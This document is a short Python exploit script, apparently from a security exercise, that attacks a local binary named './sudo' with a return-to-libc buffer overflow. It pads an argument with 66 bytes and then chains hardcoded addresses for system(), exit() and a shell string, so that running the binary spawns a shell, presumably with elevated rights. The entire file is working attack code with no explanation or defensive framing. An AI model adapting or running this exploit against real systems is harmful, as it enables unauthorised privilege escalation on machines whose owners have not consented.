import os, sys, struct


PATH_TO_SUDO = './sudo'


def get_arg():
	offset = 66
	shell_ra = 0xb7d7e82b
	system_ra = 0xb7c5dda0
	exit_ra = 0xb7c519d0
	return 'a' * offset + struct.pack('<IIIB',system_ra, exit_ra, shell_ra, 0x42)

def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
